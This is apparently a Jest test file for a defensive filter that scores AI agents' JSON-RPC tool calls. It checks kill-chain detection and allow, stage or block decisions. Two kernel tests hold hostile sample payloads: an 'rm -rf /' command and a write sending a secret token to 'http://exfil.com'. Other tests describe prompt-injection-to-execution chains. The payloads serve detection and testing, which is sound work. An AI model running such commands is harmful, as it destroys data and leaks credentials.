import { Buffer } from 'buffer';
import {
  SimdJsonTokenizer,
  EliasFanoIndex,
  ConservativeCountMinSketch,
  GroupSortDsCnn,
  BitboardMotifCounter,
  SaltedPTHash,
  TimingShield,
  Tier1MicroKernel
} from '../../src';

describe('Tier 1 Synchronous Inline Micro-Engine Suite (Blueprint Sections 3, 4, 5)', () => {
  describe('SimdJsonTokenizer (<18us)', () => {
    it('accurately indexes structural JSON characters without heap allocations', () => {
      const tokenizer = new SimdJsonTokenizer(1024);
      const json = Buffer.from('{"jsonrpc":"2.0","method":"tools/call","params":{"name":"bash"}}', 'utf8');
      const result = tokenizer.tokenize(json);

      expect(result.isUtf8Valid).toBe(true);
      expect(result.structuralCount).toBeGreaterThan(5);
      expect(result.stringCount).toBeGreaterThan(0);
      expect(result.braceDepth).toBe(0); // Balanced braces
    });

    it('fast-extracts JSON-RPC headers in sub-microsecond time', () => {
      const tokenizer = new SimdJsonTokenizer(512);
      const payload = '{"jsonrpc": "2.0", "id": 42, "method": "tools/call", "params": {}}';
      const header = tokenizer.fastExtractHeader(payload);

      expect(header.jsonrpc).toBe('2.0');
      expect(header.id).toBe(42);
      expect(header.method).toBe('tools/call');
      expect(header.hasParams).toBe(true);
    });
  });

  describe('EliasFanoIndex (Quasi-Succinct Capability Index)', () => {
    it('encodes and queries sorted integers with exact O(1) random access', () => {
      const sorted = [3, 8, 14, 25, 60, 120, 500, 1024, 2048];
      const index = new EliasFanoIndex(sorted);

      expect(index.size()).toBe(sorted.length);
      for (let i = 0; i < sorted.length; i++) {
        expect(index.get(i)).toBe(sorted[i]);
      }

      expect(index.contains(60)).toBe(true);
      expect(index.contains(1024)).toBe(true);
      expect(index.contains(999)).toBe(false);
      expect(index.contains(-1)).toBe(false);
      expect(index.contains(5000)).toBe(false);
    });
  });

  describe('ConservativeCountMinSketch (64KB Footprint)', () => {
    it('maintains strict 64KB static memory and minimal overestimation', () => {
      const sketch = new ConservativeCountMinSketch();
      expect(sketch.getMemoryFootprintBytes()).toBe(65536); // Exactly 64 KB

      sketch.update('tools/call', 5);
      sketch.update('tools/call', 3);
      sketch.update('fetch', 2);

      expect(sketch.estimate('tools/call')).toBe(8);
      expect(sketch.estimate('fetch')).toBe(2);
      expect(sketch.estimate('unseen/tool')).toBe(0);
    });
  });

  describe('GroupSortDsCnn (1-Lipschitz & Branchless Gating)', () => {
    it('guarantees 1-Lipschitz distance preservation under GroupSort-2', () => {
      const a = new Float32Array([0.8, 0.2, 0.5, 0.9]);
      const b = new Float32Array([0.7, 0.3, 0.4, 0.8]);

      // Measure L2 norm before
      let distBefore = 0;
      for (let i = 0; i < 4; i++) distBefore += Math.pow(a[i] - b[i], 2);
      distBefore = Math.sqrt(distBefore);

      GroupSortDsCnn.applyGroupSort2(a, 4);
      GroupSortDsCnn.applyGroupSort2(b, 4);

      // Measure L2 norm after
      let distAfter = 0;
      for (let i = 0; i < 4; i++) distAfter += Math.pow(a[i] - b[i], 2);
      distAfter = Math.sqrt(distAfter);

      // 1-Lipschitz invariant: ||GS(a) - GS(b)||_2 <= ||a - b||_2
      expect(distAfter).toBeLessThanOrEqual(distBefore + 1e-6);
    });

    it('performs forward pass with branchless vector sign gating', () => {
      const dscnn = new GroupSortDsCnn();
      dscnn.setThreshold(0.50);
      const input = new Float32Array(GroupSortDsCnn.SEQ_LEN * GroupSortDsCnn.CHANNELS).fill(0.1);

      const result = dscnn.forward(input);
      expect(result.riskScore).toBeGreaterThanOrEqual(0.0);
      expect(result.riskScore).toBeLessThanOrEqual(1.0);
      expect(typeof result.blocked).toBe('boolean');
      expect([0, 1]).toContain(result.actionMask);
    });
  });

  describe('BitboardMotifCounter (Streaming Graphlet Counting)', () => {
    it('detects 3-node exfiltration kill-chain motifs', () => {
      const counter = new BitboardMotifCounter();

      // Read secret -> Write staging -> Network egress
      counter.recordEvent(BitboardMotifCounter.BIT_READ_SECRET);
      counter.recordEvent(BitboardMotifCounter.BIT_WRITE_STAGE);
      counter.recordEvent(BitboardMotifCounter.BIT_NETWORK_EGRESS);

      const report = counter.evaluateMotifs();
      expect(report.detected).toBe(true);
      expect(report.activeMotifs).toContain('CHAIN-EXFILTRATION-3NODE');
      expect(report.confidenceScore).toBeGreaterThanOrEqual(0.95);
    });

    it('detects prompt injection to RCE execution graphlet', () => {
      const counter = new BitboardMotifCounter();

      counter.recordEvent(BitboardMotifCounter.BIT_PROMPT_INJECT);
      counter.recordEvent(BitboardMotifCounter.BIT_EXEC_SPAWN);

      const report = counter.evaluateMotifs();
      expect(report.detected).toBe(true);
      expect(report.activeMotifs).toContain('CHAIN-INJECTION-RCE-3NODE');
    });
  });

  describe('SaltedPTHash (Zero-Variance Single Probe)', () => {
    it('retrieves keys with strictly 2 hashes and zero variance', () => {
      const keys = ['read_file', 'write_file', 'bash_exec', 'network_fetch'];
      const values = [101, 102, 103, 104];
      const pthash = new SaltedPTHash(keys, values);

      expect(pthash.get('read_file')).toBe(101);
      expect(pthash.get('write_file')).toBe(102);
      expect(pthash.get('bash_exec')).toBe(103);
      expect(pthash.get('network_fetch')).toBe(104);
      expect(pthash.get('unknown_key')).toBeUndefined();
    });

    it('supports RCU atomic swaps', () => {
      const pthash = new SaltedPTHash(['k1'], [1]);
      const swapped = pthash.rcuSwap(['k1', 'k2'], [1, 2]);
      expect(swapped.get('k2')).toBe(2);
    });
  });

  describe('TimingShield', () => {
    it('pads sequences to fixed length L = 128', () => {
      const input = new Float32Array(10);
      const padded = TimingShield.padSequence(input, 32);
      expect(padded.length).toBe(128 * 32);
    });
  });

  describe('Tier1MicroKernel (Unified Fast-Path)', () => {
    it('operates within static memory ceiling <= 3.2MB', () => {
      const kernel = new Tier1MicroKernel();
      const memoryBytes = kernel.getTotalMemoryBytes();
      expect(memoryBytes).toBeLessThanOrEqual(3.2 * 1024 * 1024);
    });

    it('evaluates benign reads immediately to ALLOW', () => {
      const kernel = new Tier1MicroKernel();
      const payload = '{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"data://item"}}';
      // JIT warmup
      for (let i = 0; i < 5; i++) {
        kernel.evaluate(payload);
      }
      const decision = kernel.evaluate(payload);

      expect(decision.action).toBe('ALLOW');
      expect(decision.blocked).toBe(false);
      expect(decision.evalDurationMicros).toBeLessThan(5000);
    });

    it('stages high-impact mutations for Capability 2PC verification', () => {
      const kernel = new Tier1MicroKernel();
      const payload = '{"jsonrpc":"2.0","id":2,"method":"execute_command","params":{"cmd":"rm -rf /"}}';
      const decision = kernel.evaluate(payload);

      expect(decision.isHighImpactMutation).toBe(true);
      expect(decision.action).toBe('STAGED_2PC');
    });

    it('blocks immediate threat when graphlet kill-chain is triggered', () => {
      const kernel = new Tier1MicroKernel();
      // Inject exfiltration sequence
      const payload = '{"jsonrpc":"2.0","id":3,"method":"filesystem_write","params":{"secret_token":"abc","dest":"http://exfil.com"}}';
      // Simulate bitboard state
      kernel.getBitboard().recordEvent(BitboardMotifCounter.BIT_READ_SECRET);
      kernel.getBitboard().recordEvent(BitboardMotifCounter.BIT_WRITE_STAGE);
      kernel.getBitboard().recordEvent(BitboardMotifCounter.BIT_NETWORK_EGRESS);

      const decision = kernel.evaluate(payload);
      expect(decision.action).toBe('BLOCK');
      expect(decision.blocked).toBe(true);
      expect(decision.reasons[0]).toContain('Graphlet attack motif detected');
    });
  });
});
